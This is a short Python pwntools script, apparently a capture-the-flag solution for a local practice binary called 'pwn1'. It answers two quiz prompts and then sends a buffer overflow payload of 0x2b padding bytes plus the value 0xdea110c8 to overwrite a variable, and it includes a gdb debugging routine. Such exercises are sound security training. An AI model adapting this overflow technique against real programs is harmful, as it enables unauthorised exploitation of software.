#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-03-30 18:18:50
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p32
# import angr

context.arch = "i386"

filename = "./pwn1"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    answer_one = b"Sir Lancelot of Camelot"
    answer_two = b"To seek the Holy Grail."
    trash = cyclic(0x2b)
    value = p32(0xdea110c8)
    payload = trash + value

    target_process.recvuntil(b"name?")
    target_process.sendline(answer_one)

    target_process.recvuntil(b"quest?")
    target_process.sendline(answer_two)

    target_process.recvuntil(b"secret?")
    target_process.sendline(payload)


def solve():
    pass


def debug():
    gdbscript = """
    pie breakpoint 0x8b2
    start
    continue
    """

    gdb.attach(target_process, gdbscript=gdbscript)
    answer_one = b"Sir Lancelot of Camelot"
    answer_two = b"To seek the Holy Grail."
    trash = cyclic(0x2b)
    value = p32(0xdea110c8)
    payload = trash + value

    target_process.recvuntil(b"name?")
    target_process.sendline(answer_one)

    target_process.recvuntil(b"quest?")
    target_process.sendline(answer_two)

    target_process.recvuntil(b"secret?")
    target_process.sendline(payload)


if __name__ == "__main__":
    # debug()
    exploit()
    # solve()


